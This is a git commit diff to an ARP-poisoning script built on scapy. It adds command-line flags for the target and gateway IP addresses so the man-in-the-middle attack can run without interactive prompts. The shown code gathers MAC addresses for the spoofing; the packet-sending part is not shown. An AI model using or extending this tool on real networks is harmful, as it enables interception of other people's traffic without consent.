d1e2577d019709e8ea4fced41c6d639d4d2ada86
Faruk Erdem <farukomererdem2003@gmail.com>
2023-07-07 10:54:12 -0400

    Faster input fields.

--- poisoner.py
+++ poisoner.py
@@ -13,14 +13,19 @@ def show_arp_table(ip):
 def user_input():
     parser = argparse.ArgumentParser()
     parser.add_argument("-i","--ip-address",dest="ip_address",help="Enter IP address range. Example '10.0.2.1/24'")
-    parser.add_argument("-t","--time",default=3,dest="time",help="Cooldown time for arp-poisen. Default value: 3")
+    parser.add_argument("-c","--cooldown",default=3,dest="time",help="Cooldown time for arp-poisen. Default value: 3")
+    parser.add_argument("-t","--target",dest="target",help="Target IP address.",default=None)
+    parser.add_argument("-g","--gateway",dest="gateway",help="Default gateway IP address",default=None)
     args = parser.parse_args()
     return args
 
 
-def get_mac_ip_of_target():
-    print("\n\nIP address must be owned by target.")
-    ip_address = input("Enter IP Address: ")
+def get_mac_ip_of_target(target_ip):
+    if target_ip == None:
+        print("\n\nIP address must be owned by target.")
+        ip_address = input("Enter IP Address: ")
+    else:
+        ip_address = target_ip
     arp_request_packet = scapy.ARP(pdst=ip_address)
     broadcat_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     combined_packet = broadcat_packet/arp_request_packet
@@ -29,9 +34,12 @@ def get_mac_ip_of_target():
     
     return {"mac":mac_address,"ip":ip_address}
 
-def get_mac_ip_of_gateway():
-    print("\n\nThese addresses must be owned by default gateway.")
-    ip_address = input("Enter IP Address: ")
+def get_mac_ip_of_gateway(gateway_ip):
+    if gateway_ip == None:
+        print("\n\nThese addresses must be owned by default gateway.")
+        ip_address = input("Enter IP Address: ")
+    else:
+        ip_address=gateway_ip
     arp_request_packet = scapy.ARP(pdst=ip_address)
     broadcat_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     combined_packet = broadcat_packet/arp_request_packet
@@ -48,17 +56,22 @@ def send_packet(mac_ip_of_target, mac_ip_of_gateway):
 def clear_terminal():
     subprocess.call("clear")
 
+
+
+
+
 # Getting User Inputs
 args = user_input()
 
 # Showing arp table to select valid addresses.
-show_arp_table(args.ip_address)
+if (args.target == None) or (args.gateway == None):
+    show_arp_table(args.ip_address)
 
 # Getting MAC and IP address of target
-mac_ip_of_target = get_mac_ip_of_target()
+mac_ip_of_target = get_mac_ip_of_target(args.target)
 
 # Getting MAC and IP address of default gateway
-mac_ip_of_gateway = get_mac_ip_of_gateway()
+mac_ip_of_gateway = get_mac_ip_of_gateway(args.gateway)
 
 # Clear Terminal
 clear_terminal()
